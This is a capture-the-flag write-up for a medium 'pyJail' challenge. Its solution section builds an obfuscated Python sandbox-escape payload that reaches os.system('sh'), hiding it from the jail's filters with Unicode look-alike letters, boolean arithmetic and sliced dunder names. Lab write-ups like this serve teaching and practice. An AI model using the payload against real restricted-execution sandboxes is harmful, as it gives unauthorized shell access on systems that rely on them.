# [**pyJail**](#)

## Description:
* Break obm free from the prison by solving the challenge.

## Difficulty:
* Medium

## Objective:
The objective of this challenge is to escape the Python jail without using alphanumeric characters, underscores, or built-in functions.

## Deployment:
```sh
docker build -t py-jail .
docker run -p 4042:4042 py-jail
```

## Solution:
Our goal in this challenge is to bypass the restrictions and read the `flag.txt` file. The challenge restricts alphanumeric characters, underscores, and built-in functions. We will begin by bypassing the removal of the built-ins, which can be accomplished by exploiting Dunder Methods. There are several payloads that can circumvent the removal of built-ins; we will choose this one because it simplifies the process of bypassing alphabetic characters (more on this later):
```python
().__class__.__mro__[1].__subclasses__()[104].load_module('os').system('sh')
```
Before we proceed to bypass the restrictions on alphanumeric characters and underscores, we need to find the index of `<class '_frozen_importlib.BuiltinImporter'>` on the remote server, as this may differ from machine to machine. Given that we have the Dockerfile, we can test it on our local machine; in our case, it is located at index `107`. Our new payload is now:
```python
().__class__.__mro__[1].__subclasses__()[107].load_module('os').system('sh')
```
Now that we have a working payload, the next step is to bypass the restrictions on alphanumeric characters and underscores. We will start by replacing the alphabetic characters, which is straightforward. Python interprets Unicode alphabet characters as normal alphabet characters, and we can also bypass the underscore restriction using the same logic. This results in:
```python
()._＿𝘤𝘭𝘢𝘴𝘴_＿._＿𝘮𝘳𝘰_＿[1]._＿𝘴𝘶𝘣𝘤𝘭𝘢𝘴𝘴𝘦𝘴_＿()[107].𝘭𝘰𝘢𝘥_𝘮𝘰𝘥𝘶𝘭𝘦('os').𝘴𝘺𝘴𝘵𝘦𝘮('sh')
```
Next, we need to bypass two more elements: the numbers and the `os` and `sh` strings. We will start with the numbers. We can achieve this by concatenating boolean values such as `True + True`, which equals `1 + 1`, resulting in the number `2`. However, the challenge is that both True and False contain alphabetic characters. We can replace them with expressions such as `('' == '')` for `True`, and `('' != '')` for `False`.
```python
()._＿𝘤𝘭𝘢𝘴𝘴_＿._＿𝘮𝘳𝘰_＿[(''=='')+(''!='')]._＿𝘴𝘶𝘣𝘤𝘭𝘢𝘴𝘴𝘦𝘴_＿()[(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')].𝘭𝘰𝘢𝘥_𝘮𝘰𝘥𝘶𝘭𝘦('os').𝘴𝘺𝘴𝘵𝘦𝘮('sh')
```
Finally, we need to bypass the `os` and `sh` strings. We can do this by exploiting the magic attributes inherited by tuples `()`, which can be listed using the `dir()` function:
```python
>>> dir(())
['__add__', '__class__', '__class_getitem__', '__contains__', '__delattr__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__getitem__', '__getnewargs__', '__getstate__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__iter__', '__le__', '__len__', '__lt__', '__mul__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__rmul__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'count', 'index']
```
Fortunately, we have the `__subclasshook__` attribute, which includes the characters `o`, `s`, and `h`. We can use `().__subclasshook__.__name__` to get the name of the attribute and then retrieve each character using subscript notation:
```python
().__subclasshook__.__name__[11] => 'o'
().__subclasshook__.__name__[2]  => 's'
().__subclasshook__.__name__[10] => 'h'
```
By replacing the numeric and alphabetic characters using the same method, we can construct the `os` string as follows:
```python
()._＿𝘴𝘶𝘣𝘤𝘭𝘢𝘴𝘴𝘩𝘰𝘰𝘬_＿._＿𝘯𝘢𝘮𝘦_＿[(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')] + ()._＿𝘴𝘶𝘣𝘤𝘭𝘢𝘴𝘴𝘩𝘰𝘰𝘬_＿._＿𝘯𝘢𝘮𝘦_＿[(''=='')+(''=='')]
```

## Wrapping everything up gives us the Final Payload:
```python
()._＿𝘤𝘭𝘢𝘴𝘴_＿._＿𝘮𝘳𝘰_＿[(''=='')+(''!='')]._＿𝘴𝘶𝘣𝘤𝘭𝘢𝘴𝘴𝘦𝘴_＿()[(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')].𝘭𝘰𝘢𝘥_𝘮𝘰𝘥𝘶𝘭𝘦(()._＿𝘴𝘶𝘣𝘤𝘭𝘢𝘴𝘴𝘩𝘰𝘰𝘬_＿._＿𝘯𝘢𝘮𝘦_＿[(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')]+()._＿𝘴𝘶𝘣𝘤𝘭𝘢𝘴𝘴𝘩𝘰𝘰𝘬_＿._＿𝘯𝘢𝘮𝘦_＿[(''=='')+(''=='')]).𝘴𝘺𝘴𝘵𝘦𝘮(()._＿𝘴𝘶𝘣𝘤𝘭𝘢𝘴𝘴𝘩𝘰𝘰𝘬_＿._＿𝘯𝘢𝘮𝘦_＿[(''=='')+(''=='')]+()._＿𝘴𝘶𝘣𝘤𝘭𝘢𝘴𝘴𝘩𝘰𝘰𝘬_＿._＿𝘯𝘢𝘮𝘦_＿[(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')])
```